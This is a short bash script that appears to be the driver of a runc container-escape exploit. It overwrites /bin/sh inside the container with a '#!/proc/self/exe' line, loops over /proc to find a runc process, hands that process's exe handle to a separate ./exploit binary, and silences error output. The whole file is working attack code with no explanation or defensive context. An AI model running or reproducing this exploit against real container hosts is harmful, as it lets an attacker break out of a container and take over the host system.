#!/bin/bash

function pwn() {
    echo '#!/proc/self/exe' > /bin/sh
    chmod +x /bin/sh

    while true; do
        for f in /proc/*/exe; do
            tmp=${f%/*}
            pid=${tmp##*/}
            cmdline=$(cat /proc/${pid}/cmdline)

            if [[ -z ${cmdline} ]] || [[ ${cmdline} == *runc* ]]; then
                echo starting exploit
                ./exploit /proc/${pid}/exe
            fi
        done
    done
}

exec 2>/dev/null
pwn
